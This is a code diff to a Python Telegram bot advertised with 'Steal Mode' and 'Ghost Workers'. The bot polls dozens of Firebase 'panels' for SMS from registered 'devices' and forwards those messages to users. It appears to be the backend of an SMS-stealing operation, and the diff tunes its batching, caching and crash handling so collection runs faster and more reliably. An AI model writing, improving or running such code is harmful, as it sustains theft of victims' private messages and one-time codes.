@@ -5,7 +5,7 @@
   Enterprise Worker Architecture + On-Demand Sync
   + Strict 1-Hour Fast Inbox + Background Ghost Workers
   + Referral System + Strict Force Join + Steal Mode
-  + LOW-RAM OPTIMIZED (RAILWAY OOM CRASH FIX)
+  + CACHE & DEVICES LIST FIX (ULTRA-FAST LOAD)
 ══════════════════════════════════════════════════════
 """
 
@@ -55,7 +55,7 @@ BOT_USERNAME    = "offermeeshobot"
 
 # 🔴 Admin IDs
 ADMIN_IDS: set[int] = {
-    6860106371, 8306147833,  
+    6860106371, 8306147833
 }
 
 # 🔴 Force Join Channels
@@ -93,7 +93,7 @@ SETTINGS = {
     "global_panels": []
 }
 
-# 🟢 MEMORY OPTIMIZATION: Reduced concurrency to fit 500MB Railway Plan
+# Memory Safe Concurrency Limits
 API_LOCK = asyncio.Lock()
 WORKER_SEMAPHORE = asyncio.Semaphore(50) 
 PREFETCH_POOL: dict[str, list] = {}
@@ -420,7 +420,7 @@ RAW_URLS = list(set([
 DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}
 
 # ═══════════════════════════════════════════════════════
-#  DATA CLASSES
+#  DATA CLASSES 
 # ═══════════════════════════════════════════════════════
 
 class Device:
@@ -554,7 +554,6 @@ async def auto_save_loop():
             await asyncio.sleep(5)
 
 async def hourly_admin_backup(app: Application):
-    """Hourly task to send admin dashboard stats and backup JSON file."""
     while True:
         await asyncio.sleep(3600)
         try:
@@ -635,7 +634,7 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
     tlog(f"Telegram API Error: {err_str}")
 
 # ═══════════════════════════════════════════════════════
-#  FAST HTTP SESSION MANAGER (LOW RAM LIMITS)
+#  FAST HTTP SESSION MANAGER 
 # ═══════════════════════════════════════════════════════
 
 async def get_http_session() -> aiohttp.ClientSession:
@@ -749,7 +748,10 @@ async def continuous_prefetch_worker(service: str):
                 await asyncio.sleep(5)
                 continue
                 
-            all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
+            all_devices = []
+            for d_list in GLOBAL_DEVICE_CACHE.values():
+                all_devices.extend(d_list)
+
             if not all_devices:
                 await asyncio.sleep(5)
                 continue
@@ -1022,7 +1024,7 @@ async def safe_edit(query, text, reply_markup=None, parse_mode=None, disable_web
         tlog(f"Safe Edit Unexpected Error: {e}")
 
 # ═══════════════════════════════════════════════════════
-#  ON-DEMAND CACHE INJECTOR (SOLVES "NO DEVICES FOUND")
+#  ON-DEMAND CHUNKED FETCHER (ZERO CRASH & ZERO WAIT)
 # ═══════════════════════════════════════════════════════
 
 async def fetch_db_data(tag: str, url: str) -> list[Device]:
@@ -1120,11 +1122,16 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
             missing_tags.append(tag)
 
     if missing_tasks:
-        results = await asyncio.gather(*missing_tasks, return_exceptions=True)
-        for tag, res in zip(missing_tags, results):
-            if isinstance(res, list):
-                GLOBAL_DEVICE_CACHE[tag] = res
-                devices.extend(res)
+        # 🔴 FIXED: Fetches missing panels in small safe batches of 20 to prevent crashes
+        for i in range(0, len(missing_tasks), 20):
+            c_tasks = missing_tasks[i:i+20]
+            c_tags = missing_tags[i:i+20]
+            results = await asyncio.gather(*c_tasks, return_exceptions=True)
+            for tag, res in zip(c_tags, results):
+                if isinstance(res, list):
+                    GLOBAL_DEVICE_CACHE[tag] = res
+                    devices.extend(res)
+            await asyncio.sleep(0.2)
 
     unique_devices = []
     seen_ids_set = set()
@@ -1631,7 +1638,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         except: pass
 
 # ═══════════════════════════════════════════════════════
-#  TEXT MESSAGE HANDLER (ANTI-SPAM & CHOKE FIX)
+#  TEXT MESSAGE HANDLER
 # ═══════════════════════════════════════════════════════
 
 async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1902,7 +1909,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
 # ═══════════════════════════════════════════════════════
-#  FIREBASE POLL — BATCH PROCESSING (OOM FIX)
+#  FIREBASE POLL — FAST CONCURRENT ENGINE
 # ═══════════════════════════════════════════════════════
 
 async def _forward_sms(device: Device, sms: dict) -> None:
@@ -2027,15 +2034,17 @@ async def _update_global_cache():
     all_devices_gathered = []
     items = list(dbs_to_poll.items())
     
-    for i in range(0, len(items), 30):
-        chunk = items[i:i+30]
+    # 🔴 CACHE FIX: Safely store individual tags to prevent "On-Demand" Crash
+    for i in range(0, len(items), 25):
+        chunk = items[i:i+25]
         tasks = [fetch_db_data(tag, url) for tag, url in chunk]
         res = await asyncio.gather(*tasks, return_exceptions=True)
-        for r in res:
+        for (tag, url), r in zip(chunk, res):
             if isinstance(r, list):
+                GLOBAL_DEVICE_CACHE[tag] = r
                 all_devices_gathered.extend(r)
                 
-        await asyncio.sleep(0.2) 
+        await asyncio.sleep(0.3) 
         gc.collect() 
         
     unique_devices = []
@@ -2075,8 +2084,8 @@ async def poll_loop(app: Application) -> None:
             
             if first_run:
                 items = list(dbs_to_poll.items())
-                for i in range(0, len(items), 30):
-                    chunk = items[i:i+30]
+                for i in range(0, len(items), 20):
+                    chunk = items[i:i+20]
                     tasks = []
                     for tag, url in chunk:
                         tasks.append(fb_get("All_Users/sms", url))
@@ -2096,11 +2105,11 @@ async def poll_loop(app: Application) -> None:
                 tlog("Private Bot Engine ready! Monitoring DBs...")
             else:
                 items = list(dbs_to_poll.items())
-                for i in range(0, len(items), 30):
-                    chunk = items[i:i+30]
+                for i in range(0, len(items), 25):
+                    chunk = items[i:i+25]
                     tasks = [poll_single_db(tag, url) for tag, url in chunk]
                     await asyncio.gather(*tasks, return_exceptions=True)
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.3)
                     gc.collect()
                     
         except Exception as e:
@@ -2110,7 +2119,7 @@ async def poll_loop(app: Application) -> None:
         await asyncio.sleep(POLL_INTERVAL)
 
 # ═══════════════════════════════════════════════════════
-#  MAIN ENTRY POINT (LOW RAM LIMITS)
+#  MAIN ENTRY POINT (CRASH PROOF)
 # ═══════════════════════════════════════════════════════
 
 def main() -> None:
@@ -2139,10 +2148,13 @@ def main() -> None:
     app.add_error_handler(global_error_handler)
 
     async def post_init(application: Application) -> None:
-        load_data()
-        asyncio.create_task(poll_loop(application))
-        asyncio.create_task(auto_save_loop())
-        asyncio.create_task(hourly_admin_backup(application))
+        try:
+            load_data()
+            asyncio.create_task(poll_loop(application))
+            asyncio.create_task(auto_save_loop())
+            asyncio.create_task(hourly_admin_backup(application))
+        except Exception as e:
+            tlog(f"Post Init Error: {e}")
 
     app.post_init = post_init
     app.run_polling(drop_pending_updates=True)
